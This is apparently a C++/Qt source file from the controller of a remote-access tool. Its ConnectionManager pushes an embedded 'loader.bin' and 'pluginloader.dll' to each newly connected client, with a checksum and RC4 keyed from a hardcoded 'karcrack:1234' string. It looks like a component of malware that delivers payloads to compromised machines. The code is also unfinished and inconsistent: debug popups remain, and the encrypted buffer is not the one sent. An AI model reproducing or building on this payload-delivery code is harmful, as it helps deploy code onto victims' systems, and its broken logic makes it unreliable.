#include "connectionmanager.h"

//Delete
#include <QMessageBox>

ConnectionManager::ConnectionManager(MessageManager* mngMessage,QObject* parent) : QObject(parent)
{
    this->mngMessage=mngMessage;

    connect(this,SIGNAL(ConnectionEstablished(Connection*)),this,SLOT(addConnection(Connection*)));
    //connect ConnectionEstablished -> GUI
}

void ConnectionManager::SetupConnection(Connection *connection)
{
    if(connection->getSetupState()==Connection::JustConnected)
    {
            QFile fileLoader(":/res/loader.bin");
            QFile filePluginLoader(":/res/pluginloader.dll");

            if(!fileLoader.open(QIODevice::ReadOnly)) return;
            if(!filePluginLoader.open(QIODevice::ReadOnly)) return;

            QByteArray Loader=fileLoader.readAll();
            QByteArray PluginLoader=filePluginLoader.readAll();

            QByteArray TotalToSend;
            TotalToSend.append(Loader);
            TotalToSend.append(PluginLoader);

            Crypto Crypt1(TotalToSend);
            qint32 CheckSum=Crypt1.jenkins_one_at_a_time();
            //TODO
            TotalToSend.insert(0,(char*)&CheckSum,4);
            Crypto Crypt2(TotalToSend);
            QString sha1=Crypt1.sha1(QString("karcrack:1234"));
            QMessageBox::information(0,"Hash SHA1",sha1);
            Crypt1.RC4(sha1.toAscii());

            QMessageBox::information(0,"Checksum","0x"+QString::number(CheckSum,16));

            TotalToSend.clear();
            TotalToSend.append((char*)&CheckSum,4);
            TotalToSend.append(Crypt2.getData());

            connection->write(TotalToSend);

            connect(connection,SIGNAL(readyRead()),mngMessage,SLOT(readMessage()));
            connection->setState(Connection::Ready);
            connection->setSetupState(Connection::Finished);
    }
    else if(connection->getSetupState()==Connection::Finished)
    {
            connection->setState(Connection::Ready);
            emit ConnectionEstablished(connection);
    }
}

void ConnectionManager::addConnection(Connection* connection)
{
    Connections.append(connection);
}
